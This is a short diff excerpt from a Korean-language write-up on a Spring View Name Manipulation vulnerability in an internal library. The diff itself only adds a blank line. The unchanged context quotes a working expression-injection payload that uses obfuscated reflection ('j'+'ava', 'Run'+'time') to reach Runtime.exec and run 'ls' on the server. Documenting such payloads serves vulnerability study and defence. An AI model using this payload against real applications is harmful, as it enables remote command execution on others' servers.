@@ -223,3 +223,4 @@ Spring View Name Manipulation 취약점인데, 내부 라이브러리에서 발�
 페이로드는 아래와 같다.
 
 ```${''.getClass().forName('j'+'ava.util.Scanner').getConstructor(''.getClass().forName('j'+'ava.io.InputStream')).newInstance(''.getClass().forName('j'+'ava.lang.Run'+'time').getMethods()[6].invoke(null).exec('ls').getInputStream()).next()}::```
+ 
